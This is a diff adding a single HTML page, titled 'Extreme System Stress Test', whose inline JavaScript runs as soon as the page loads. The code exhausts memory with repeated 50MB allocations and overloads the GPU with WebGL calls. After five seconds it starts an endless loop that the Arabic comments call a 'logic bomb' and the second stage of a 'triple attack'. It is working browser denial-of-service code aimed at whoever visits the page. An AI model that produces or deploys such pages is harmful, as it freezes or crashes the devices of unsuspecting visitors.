@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Extreme System Stress Test</title>
+</head>
+<body style="background:#000; color:#f00; font-family:monospace;">
+    <h1>CRITICAL STRESS TEST</h1>
+    <div id="status">INITIATING...</div>
+
+    <script>
+        // 1. استنزاف الذاكرة بشكل هجومي (Buffer Bloating)
+        function memoryAttack() {
+            setInterval(() => {
+                try {
+                    // تخصيص مساحات ضخمة جداً في الـ Heap
+                    let buffer = new ArrayBuffer(1024 * 1024 * 50); // 50MB per tick
+                    let view = new Float64Array(buffer);
+                    for(let i=0; i<view.length; i++) view[i] = Math.random();
+                    window.lastBuffer = buffer; 
+                } catch(e) {}
+            }, 50);
+        }
+
+        // 2. إرهاق المعالج الرسومي (GPU Melt)
+        function gpuAttack() {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            setInterval(() => {
+                for (let i = 0; i < 10000; i++) {
+                    gl.clear(gl.COLOR_BUFFER_BIT); // إجبار الـ GPU على إعادة الرسم
+                }
+            }, 1);
+        }
+
+        // 3. الحلقة القاتلة (The Logic Bomb)
+        // هذه تمنع الـ OOM Killer من العمل بهدوء لأنها تشغل الـ Main Thread تماماً
+        function logicBomb() {
+            setTimeout(() => {
+                document.getElementById('status').innerText = "SYSTEM FREEZE IMMINENT";
+                while(true) {
+                    // توليد بيانات وتشفيرها في حلقة مفرغة
+                    crypto.getRandomValues(new Uint8Array(1000000));
+                    history.pushState(null, "", Math.random().toString());
+                }
+            }, 5000);
+        }
+
+        // تنفيذ الهجوم الثلاثي
+        memoryAttack();
+        gpuAttack();
+        logicBomb();
+    </script>
+</body>
+</html>
